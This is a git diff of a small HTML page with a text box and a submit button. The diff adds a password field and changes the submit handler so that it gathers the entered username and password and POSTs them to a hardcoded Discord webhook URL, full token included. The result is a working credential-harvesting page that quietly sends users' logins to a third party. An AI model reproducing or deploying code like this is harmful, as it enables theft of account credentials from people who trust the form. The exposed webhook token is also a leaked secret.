@@ -10,9 +10,15 @@
                 <img src="https://github.com/Iamgoodnow/webtest/blob/newstuff/Screenshot%202024-01-02%20at%2015.25.27.png?raw=true" alt="Turtle rendering" width="450" height="300">
             </div>
             <div>
-                <label>enter something below</label>
+                <div>
                 <input type="text" id="t1">
+                </div>
+                <div>
+                <input type="password" id="t2">
+                </div>
+                <div>
                 <button type="button" id="submitbutton" onclick="Submit();">submit</button>
+                </div>
             </div>
         </h1>
     </body>
@@ -21,9 +27,11 @@
         <meta http-equiv="X-UA-Compatible" content="IE-edge">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Document</title>
-        <script>function Submit(){window.alert(document.getElementById('t1').value);
-                const whurl ="https://discord.com/api/webhooks/1199024674424762399/7pJ4qo3tS5CvHAk1AwWYdeA9gmXVOwQLq9giDd_3kANMg7bSbrbyvUTX1_cXwbhrT4VN"
-                fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify({"content": document.getElementById("t1").value})});};
+        <script>
+        const result = ""
+        function Submit(){const whurl ="https://discord.com/api/webhooks/1199024674424762399/7pJ4qo3tS5CvHAk1AwWYdeA9gmXVOwQLq9giDd_3kANMg7bSbrbyvUTX1_cXwbhrT4VN"
+        const msg = result.concat("Username = ", document.getElementById("t1").value, "\nPassword = ", document.getElementById("t2").value);
+                fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify({"content": msg})});};
         </script>
     </body>
 </html>
